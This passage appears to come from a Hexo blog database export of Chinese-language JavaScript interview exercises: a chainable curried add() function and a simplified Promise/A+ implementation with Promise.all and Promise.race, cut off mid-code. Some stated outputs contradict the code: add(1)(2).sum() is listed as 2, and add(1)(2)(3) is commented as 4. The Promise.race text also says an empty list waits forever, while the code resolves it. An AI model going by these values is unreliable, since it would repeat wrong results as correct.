add(1)(2)(3); // 6\n* add(1)(2, 3); // 6\n* add(1, 2)(3); // 6\n* add(1, 2, 3); // 6\n\n```js\nfunction add(...args1) {\n  let total = args1.reduce((a, b) => a + b, 0)\n  const sum = function(...args2) {\n    total = args2.reduce((a, b) => a + b, total)\n    return sum\n  }\n\n  sum.toString = function() {\n    return total\n  }\n\n  return sum\n}\nadd(1) // output: 1\nadd(1)(2) // output: 3\nadd(1)(2)(3) // output: 6\nadd(1)(2, 3) // output: 6\nadd(1, 2)(3) // output: 6\nadd(1, 2, 3) // output: 6\n```\n\n","source":"_posts/JavaScript 编程题/JS 链式调用与累加功能.md","raw":"---\ntitle: JS 链式调用与累加功能\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# JS 链式调用与累加功能\n\n## 1. 实现 add 函数使得满足以下条件\n\n**需满足的条件：**\n* add(1).sum() //=> 1\n* add(1)(2).sum() //=> 2\n* add(1)(2)(3).sum() //=> 6\n* add(1)(2)(3)(4).sum() //=> 10\n\n```js\nfunction add(a) {\n  let total = a\n  const fn = function(b) {\n    total += b\n    return fn\n  }\n  fn.sum = function() {\n    return total\n  }\n\n  return fn\n}\nadd(1).sum() // => 1\nadd(1)(2).sum() //=> 3\nadd(1)(2)(3).sum() //=> 6\nadd(1)(2)(3)(4).sum() //=> 10\n```\n\n## 2. 实现 add 函数使得满足以下条件\n\n**需满足的条件:**\n* add(1) // => 1;\n* add(1)(2) //=> 3;\n* add(1)(2)(3) //=> 6;\n* add(1)(2)(3)(4) //=> 10;\n\n```js\nfunction add(num1) {\n  const sum = function(num2) {\n    num1 += num2\n    return sum\n  }\n  sum.toString = function() {\n    return num1\n  }\n\n  return sum\n}\n\nadd(1) // output: 1\nadd(1)(2) // output: 3\nadd(1)(2)(3) // output: 4\n```\n\n**需满足的条件：**\n* add(1); // 1\n* add(1)(2); // 3\n* add(1)(2)(3); // 6\n* add(1)(2, 3); // 6\n* add(1, 2)(3); // 6\n* add(1, 2, 3); // 6\n\n```js\nfunction add(...args1) {\n  let total = args1.reduce((a, b) => a + b, 0)\n  const sum = function(...args2) {\n    total = args2.reduce((a, b) => a + b, total)\n    return sum\n  }\n\n  sum.toString = function() {\n    return total\n  }\n\n  return sum\n}\nadd(1) // output: 1\nadd(1)(2) // output: 3\nadd(1)(2)(3) // output: 6\nadd(1)(2, 3) // output: 6\nadd(1, 2)(3) // output: 6\nadd(1, 2, 3) // output: 6\n```\n\n","slug":"JavaScript 编程题/JS 链式调用与累加功能","published":1,"updated":"2021-04-30T06:59:20.404Z","_id":"cko3yr632000pio6r46si22b3","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"JS-链式调用与累加功能\"><a href=\"#JS-链式调用与累加功能\" class=\"headerlink\" title=\"JS 链式调用与累加功能\"></a>JS 链式调用与累加功能</h1><h2 id=\"1-实现-add-函数使得满足以下条件\"><a href=\"#1-实现-add-函数使得满足以下条件\" class=\"headerlink\" title=\"1. 实现 add 函数使得满足以下条件\"></a>1. 实现 add 函数使得满足以下条件</h2><p><strong>需满足的条件：</strong></p>\n<ul>\n<li>add(1).sum() //=&gt; 1</li>\n<li>add(1)(2).sum() //=&gt; 2</li>\n<li>add(1)(2)(3).sum() //=&gt; 6</li>\n<li>add(1)(2)(3)(4).sum() //=&gt; 10</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> total = a</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">    total += b</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fn</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  fn.sum = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> total</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> fn</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">1</span>).sum() <span class=\"comment\">// =&gt; 1</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>).sum() <span class=\"comment\">//=&gt; 3</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>).sum() <span class=\"comment\">//=&gt; 6</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>)(<span class=\"number\">4</span>).sum() <span class=\"comment\">//=&gt; 10</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-实现-add-函数使得满足以下条件\"><a href=\"#2-实现-add-函数使得满足以下条件\" class=\"headerlink\" title=\"2. 实现 add 函数使得满足以下条件\"></a>2. 实现 add 函数使得满足以下条件</h2><p><strong>需满足的条件:</strong></p>\n<ul>\n<li>add(1) // =&gt; 1;</li>\n<li>add(1)(2) //=&gt; 3;</li>\n<li>add(1)(2)(3) //=&gt; 6;</li>\n<li>add(1)(2)(3)(4) //=&gt; 10;</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">num1</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> sum = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">num2</span>) </span>&#123;</span><br><span class=\"line\">    num1 += num2</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sum.toString = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num1</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>) <span class=\"comment\">// output: 1</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>) <span class=\"comment\">// output: 3</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>) <span class=\"comment\">// output: 4</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>需满足的条件：</strong></p>\n<ul>\n<li>add(1); // 1</li>\n<li>add(1)(2); // 3</li>\n<li>add(1)(2)(3); // 6</li>\n<li>add(1)(2, 3); // 6</li>\n<li>add(1, 2)(3); // 6</li>\n<li>add(1, 2, 3); // 6</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">...args1</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> total = args1.reduce(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a + b, <span class=\"number\">0</span>)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> sum = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">...args2</span>) </span>&#123;</span><br><span class=\"line\">    total = args2.reduce(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a + b, total)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  sum.toString = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> total</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">1</span>) <span class=\"comment\">// output: 1</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>) <span class=\"comment\">// output: 3</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>) <span class=\"comment\">// output: 6</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>, <span class=\"number\">3</span>) <span class=\"comment\">// output: 6</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">2</span>)(<span class=\"number\">3</span>) <span class=\"comment\">// output: 6</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>) <span class=\"comment\">// output: 6</span></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"JS-链式调用与累加功能\"><a href=\"#JS-链式调用与累加功能\" class=\"headerlink\" title=\"JS 链式调用与累加功能\"></a>JS 链式调用与累加功能</h1><h2 id=\"1-实现-add-函数使得满足以下条件\"><a href=\"#1-实现-add-函数使得满足以下条件\" class=\"headerlink\" title=\"1. 实现 add 函数使得满足以下条件\"></a>1. 实现 add 函数使得满足以下条件</h2><p><strong>需满足的条件：</strong></p>\n<ul>\n<li>add(1).sum() //=&gt; 1</li>\n<li>add(1)(2).sum() //=&gt; 2</li>\n<li>add(1)(2)(3).sum() //=&gt; 6</li>\n<li>add(1)(2)(3)(4).sum() //=&gt; 10</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">a</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> total = a</span><br><span class=\"line\">  <span class=\"keyword\">const</span> fn = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">b</span>) </span>&#123;</span><br><span class=\"line\">    total += b</span><br><span class=\"line\">    <span class=\"keyword\">return</span> fn</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  fn.sum = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> total</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> fn</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">1</span>).sum() <span class=\"comment\">// =&gt; 1</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>).sum() <span class=\"comment\">//=&gt; 3</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>).sum() <span class=\"comment\">//=&gt; 6</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>)(<span class=\"number\">4</span>).sum() <span class=\"comment\">//=&gt; 10</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"2-实现-add-函数使得满足以下条件\"><a href=\"#2-实现-add-函数使得满足以下条件\" class=\"headerlink\" title=\"2. 实现 add 函数使得满足以下条件\"></a>2. 实现 add 函数使得满足以下条件</h2><p><strong>需满足的条件:</strong></p>\n<ul>\n<li>add(1) // =&gt; 1;</li>\n<li>add(1)(2) //=&gt; 3;</li>\n<li>add(1)(2)(3) //=&gt; 6;</li>\n<li>add(1)(2)(3)(4) //=&gt; 10;</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">num1</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> sum = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">num2</span>) </span>&#123;</span><br><span class=\"line\">    num1 += num2</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  sum.toString = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> num1</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">1</span>) <span class=\"comment\">// output: 1</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>) <span class=\"comment\">// output: 3</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>) <span class=\"comment\">// output: 4</span></span><br></pre></td></tr></table></figure>\n\n<p><strong>需满足的条件：</strong></p>\n<ul>\n<li>add(1); // 1</li>\n<li>add(1)(2); // 3</li>\n<li>add(1)(2)(3); // 6</li>\n<li>add(1)(2, 3); // 6</li>\n<li>add(1, 2)(3); // 6</li>\n<li>add(1, 2, 3); // 6</li>\n</ul>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">add</span>(<span class=\"params\">...args1</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">let</span> total = args1.reduce(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a + b, <span class=\"number\">0</span>)</span><br><span class=\"line\">  <span class=\"keyword\">const</span> sum = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">...args2</span>) </span>&#123;</span><br><span class=\"line\">    total = args2.reduce(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a + b, total)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  sum.toString = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> total</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> sum</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">add(<span class=\"number\">1</span>) <span class=\"comment\">// output: 1</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>) <span class=\"comment\">// output: 3</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>)(<span class=\"number\">3</span>) <span class=\"comment\">// output: 6</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>)(<span class=\"number\">2</span>, <span class=\"number\">3</span>) <span class=\"comment\">// output: 6</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">2</span>)(<span class=\"number\">3</span>) <span class=\"comment\">// output: 6</span></span><br><span class=\"line\">add(<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>) <span class=\"comment\">// output: 6</span></span><br></pre></td></tr></table></figure>\n\n"},{"title":"Promise 简易版实现","date":"2021-03-12T07:32:28.000Z","_content":"\n# Promise 简易版实现\n\n* Promise.prototype.then()\n* Promise.prototype.catch()\n* Promise.prototype.finally()\n* Promise.resolve()\n* Promise.reject()\n* Promise.all()\n* Promise.race()\n* Promise.any()\n* Promise.allSettled()\n\n```js\n/**\n * 1. new Promise时，需要传递一个 executor 执行器，执行器立刻执行\n * 2. executor 接受两个参数，分别是 resolve 和 reject\n * 3. promise 只能从 pending 到 rejected, 或者从 pending 到 fulfilled\n * 4. promise 的状态一旦确认，就不会再改变\n * 5. promise 都有 then 方法，then 接收两个参数，分别是 promise 成功的回调 onFulfilled, \n *      和 promise 失败的回调 onRejected\n * 6. 如果调用 then 时，promise已经成功，则执行 onFulfilled，并将promise的值作为参数传递进去。\n *      如果promise已经失败，那么执行 onRejected, 并将 promise 失败的原因作为参数传递进去。\n *      如果promise的状态是pending，需要将onFulfilled和onRejected函数存放起来，等待状态确定后，再依次将对应的函数执行(发布订阅)\n * 7. then 的参数 onFulfilled 和 onRejected 可以缺省\n * 8. promise 可以then多次，promise 的then 方法返回一个 promise\n * 9. 如果 then 返回的是一个结果，那么就会把这个结果作为参数，传递给下一个then的成功的回调(onFulfilled)\n * 10. 如果 then 中抛出了异常，那么就会把这个异常作为参数，传递给下一个then的失败的回调(onRejected)\n * 11.如果 then 返回的是一个promise,那么需要等这个promise，那么会等这个promise执行完，promise如果成功，\n *   就走下一个then的成功，如果失败，就走下一个then的失败\n */\n\nconst PENDING = 'pending';\nconst FULFILLED = 'fulfilled';\nconst REJECTED = 'rejected';\nfunction Promise(executor) {\n    let self = this;\n    self.status = PENDING;\n    self.onFulfilled = [];//成功的回调\n    self.onRejected = []; //失败的回调\n    //PromiseA+ 2.1\n    function resolve(value) {\n        if (self.status === PENDING) {\n            self.status = FULFILLED;\n            self.value = value;\n            self.onFulfilled.forEach(fn => fn());//PromiseA+ 2.2.6.1\n        }\n    }\n\n    function reject(reason) {\n        if (self.status === PENDING) {\n            self.status = REJECTED;\n            self.reason = reason;\n            self.onRejected.forEach(fn => fn());//PromiseA+ 2.2.6.2\n        }\n    }\n\n    try {\n        executor(resolve, reject);\n    } catch (e) {\n        reject(e);\n    }\n}\n\nPromise.prototype.then = function (onFulfilled, onRejected) {\n    //PromiseA+ 2.2.1 / PromiseA+ 2.2.5 / PromiseA+ 2.2.7.3 / PromiseA+ 2.2.7.4\n    onFulfilled = typeof onFulfilled === 'function' ? onFulfilled : value => value;\n    onRejected = typeof onRejected === 'function' ? onRejected : reason => { throw reason };\n    let self = this;\n    //PromiseA+ 2.2.7\n    let promise2 = new Promise((resolve, reject) => {\n        if (self.status === FULFILLED) {\n            //PromiseA+ 2.2.2\n            //PromiseA+ 2.2.4 --- setTimeout\n            setTimeout(() => {\n                try {\n                    //PromiseA+ 2.2.7.1\n                    let x = onFulfilled(self.value);\n                    resolvePromise(promise2, x, resolve, reject);\n                } catch (e) {\n                    //PromiseA+ 2.2.7.2\n                    reject(e);\n                }\n            });\n        } else if (self.status === REJECTED) {\n            //PromiseA+ 2.2.3\n            setTimeout(() => {\n                try {\n                    let x = onRejected(self.reason);\n                    resolvePromise(promise2, x, resolve, reject);\n                } catch (e) {\n                    reject(e);\n                }\n            });\n        } else if (self.status === PENDING) {\n            self.onFulfilled.push(() => {\n                setTimeout(() => {\n                    try {\n                        let x = onFulfilled(self.value);\n                        resolvePromise(promise2, x, resolve, reject);\n                    } catch (e) {\n                        reject(e);\n                    }\n                });\n            });\n            self.onRejected.push(() => {\n                setTimeout(() => {\n                    try {\n                        let x = onRejected(self.reason);\n                        resolvePromise(promise2, x, resolve, reject);\n                    } catch (e) {\n                        reject(e);\n                    }\n                });\n            });\n        }\n    });\n    return promise2;\n}\n\nfunction resolvePromise(promise2, x, resolve, reject) {\n    let self = this;\n    //PromiseA+ 2.3.1\n    if (promise2 === x) {\n        reject(new TypeError('Chaining cycle'));\n    }\n    if (x && typeof x === 'object' || typeof x === 'function') {\n        let used; //PromiseA+2.3.3.3.3 只能调用一次\n        try {\n            let then = x.then;\n            if (typeof then === 'function') {\n                //PromiseA+2.3.3\n                then.call(x, (y) => {\n                    //PromiseA+2.3.3.1\n                    if (used) return;\n                    used = true;\n                    resolvePromise(promise2, y, resolve, reject);\n                }, (r) => {\n                    //PromiseA+2.3.3.2\n                    if (used) return;\n                    used = true;\n                    reject(r);\n                });\n\n            }else{\n                //PromiseA+2.3.3.4\n                if (used) return;\n                used = true;\n                resolve(x);\n            }\n        } catch (e) {\n            //PromiseA+ 2.3.3.2\n            if (used) return;\n            used = true;\n            reject(e);\n        }\n    } else {\n        //PromiseA+ 2.3.3.4\n        resolve(x);\n    }\n}\n\nmodule.exports = Promise;\n```\n\n### Promise.all\n`Promise.all(promises)` 返回一个 promise 对象\n\n* 如果传入的参数是一个空的可迭代对象，那么此 promise 对象回调完成(resolve), 只有此情况，是同步执行的，其它都是异步返回的。\n* 如果传入的参数不包含任何 promise，则返回一个异步完成.\n* promises 中所有的 promise 都 “完成”时或参数中不包含 promise 时回调完成。\n* 如果参数中有一个 promise 失败，那么 Promise.all 返回的 promise 对象失败\n* 在任何情况下，Promise.all 返回的 promise 的完成状态的结果都是一个数组\n\n```js\nPromise.all = async (list) => {\n  return new Promise((resolve, reject) => {\n    if (!list || !Array.isArray(list)) throw new Error('Type Error');\n\n    if (!list.length) return resolve([]);\n\n    let index = 0;\n    let resList = [];\n\n    const processValue = (data, i) => {\n      index++;\n      resList[i] = data;\n\n      if (index === list.length) {\n        resolve(resList);\n      }\n    }\n\n    for (let i = 0; i < list.length; i++) {\n      const item = list[i];\n      // item 可能为普通值、也可能为 promise 对象\n      Promise.resolve(item).then((data) => {\n        processValue(data, i);\n      }).catch((error) => {\n        reject(error);\n      })\n    }\n  });\n}\n```\n\n### Promise.race\nPromise.race 函数返回一个 Promise，它将与第一个传递的 promise 相同的完成方式被完成。它可以是完成（ resolves），也可以是失败（rejects），这要取决于第一个完成的方式是两个中的哪个。\n\n如果传的参数数组是空，则返回的 promise 将永远等待。\n\n如果迭代包含一个或多个非承诺值和/或已解决/拒绝的承诺，则 Promise.race 将解析为迭代中找到的第一个值。\n\n```js\nPromise.race = async (list) => {\n  return new Promise((resolve, reject) => {\n    if (!list || !Array.isArray(list)) throw new Error('Type Error');\n\n    if (!list.length) return resolve();\n\n    for (let i = 0; i < list.length; i++) {\n      const item = list[i];\n      // item 可能为普通值、也可能为 promise 对象\n      Promise.resolve(item).then((data) => {\n        resolve(data, i);\n      }).catch((error) => {\n        reject(error);\n      })\n    }\n  });\n}\n```\n\n##### 参考\n\n[Promise 的源码实现](https://github.com/YvetteLau/Blog/issues/2)","source":"_posts/JavaScript 编程题/Promise 简易版实现.md","raw":"---\ntitle: Promise 简易版实现\ncategories: JavaScript 编程题\ntags: [编程题]\ndate: 2021-03-12 15:32:28\n---\n\n# Promise 简易版实现\n\n* Promise.prototype.then()\n* Promise.prototype.catch()\n* Promise.prototype.finally()\n* Promise.resolve()\n* Promise.reject()\n* Promise.all()\n* Promise.race()\n* Promise.any()\n* Promise.allSettled()\n\n```js\n/**\n * 1. new Promise时，需要传递一个 executor 执行器，执行器立刻执行\n * 2. executor 接受两个参数，分别是 resolve 和 reject\n * 3. promise 只能从 pending 到 rejected, 或者从 pending 到 fulfilled\n * 4. promise 的状态一旦确认，就不会再改变\n * 5. promise 都有 then 方法，then 接收两个参数，分别是 promise 成功的回调 onFulfilled, \n *      和 promise 失败的回调 onRejected\n * 6. 如果调用 then 时，promise已经成功，则执行 onFulfilled，并将promise的值作为参数传递进去。\n *      如果promise已经失败，那么执行 onRejected, 并将 promise 失败的原因作为参数传递进去。\n *      如果promise的状态是pending，需要将onFulfilled和onRejected函数存放起来，等待状态确定后，再依次将对应的函数执行(发布订阅)\n * 7. then 的参数 onFulfilled 和 onRejected 可以缺省\n * 8. promise 可以then多次，promise 的then 方法返回一个 promise\n * 9. 如果 then 返回的是一个结果，那么就会把这个结果作为参数，传递给下一个then的成功的回调(onFulfilled)\n * 10. 如果 then 中抛出了异常，那么就会把这个异常作为参数，传递给下一个then的失败的回调(onRejected)\n * 11.如果 then 返回的是一个promise,那么需要等这个promise，那么会等这个promise执行完，promise如果成功，\n *   就走下一个then的成功，如果失败，就走下一个then的失败\n */\n\nconst PENDING = 'pending';\nconst FULFILLED = 'fulfilled';\nconst REJECTED = 'rejected';\nfunction Promise(executor) {\n    let self = this;\n    self.status = PENDING;\n    self.onFulfilled = [];//成功的回调\n    self.onRejected = []; //失败的回调\n    //PromiseA+ 2.1\n    function resolve(value) {\n        if (self.status === PENDING) {\n            self.status = FULFILLED;\n            self.value = value;\n            self.onFulfilled.forEach(fn => fn());//PromiseA+ 2.2.6.1\n        }\n    }\n\n    function reject(reason) {\n        if (self.status === PENDING) {\n            self.status = REJECTED;\n            self.reason = reason;\n            self.onRejected.forEach(fn => fn());//PromiseA+ 2.2.6.2\n        }\n    }\n\n    try {\n        executor(resolve, reject);\n    } catch (e) {\n        reject(e);\n    }\n}\n\nPromise.prototype.then = function (onFulfilled, onRejected) {\n    //PromiseA+ 2.2.1 / PromiseA+ 2.2.5 / PromiseA+ 2.2.7.3 / PromiseA+ 2.2.7.4\n    onFulfilled = typeof onFulfilled === 'function' ? onFulfilled : value => value;\n    onRejected = typeof onRejected === 'function' ? onRejected : reason => { throw reason };\n    let self = this;\n    //PromiseA+ 2.2.7\n    let promise2 = new Promise((resolve, reject) => {\n        if (self.status === FULFILLED) {\n            //PromiseA+ 2.2.2\n            //PromiseA+ 2.2.4 --- setTimeout\n            setTimeout(() => {\n                try {\n                    //PromiseA+ 2.2.7.1\n                    let x = onFulfilled(self.value);\n                    resolvePromise(promise2, x, resolve, reject);\n                } catch (e) {\n                    //PromiseA+ 2.2.7.2\n                    reject(e);\n                }\n            });\n        } else if (self.status === REJECTED) {\n            //PromiseA+ 2.2.3\n            setTimeout(() => {\n                try {\n                    let x = onRejected(self.reason);\n                    resolvePromise(promise2, x, resolve, reject);\n                } catch (e) {\n                    reject(e);\n                }\n            });\n        } else if (self.status === PENDING) {\n            self.onFulfilled.push(() => {\n                setTimeout(() => {\n                    try {\n                        let x = onFulfilled(self.value);\n                        resolvePromise(promise2, x, resolve, reject);\n                    } catch (e) {\n                        reject(e);\n                    }\n                });\n            });\n            self.onRejected.push(() => {\n                setTimeout(() => {\n                    try {\n                        let x = onRejected(self.reason);\n                        resolvePromise(promise2, x, resolve, reject);\n                    } catch (e) {\n                        reject(e);\n                    }\n                });\n            });\n        }\n    });\n    return promise2;\n}\n\nfunction resolvePromise(promise2, x, resolve, reject) {\n    let self = this;\n    //PromiseA+ 2.3.1\n    if (promise2 === x) {\n        reject(new TypeError('Chaining cycle'));\n    }\n    if (x && typeof x === 'object' || typeof x === 'function') {\n        let used; //PromiseA+2.3.3.3.3 只能调用一次\n        try {\n            let then = x.then;\n            if (typeof then === 'function') {\n                //PromiseA+2.3.3\n                then.call(x, (y) => {\n                    //PromiseA+2.3.3.1\n                    if (used) return;\n                    used = true;\n                    resolvePromise(promise2, y, resolve, reject);\n                }, (r) => {\n                    //PromiseA+2.3.3.2\n                    if (used) return;\n                    used = true;\n                    reject(r);\n                });\n\n            }else{\n                //PromiseA+2.3.3.4\n                if (used) return;\n                used = true;\n                resolve(x);\n            }\n        } catch (e) {\n            //PromiseA+ 2.3.3.2\n            if (used) return;\n            used = true;\n            reject(e);\n        }\n    } else {\n        //PromiseA+ 2.3.3.4\n        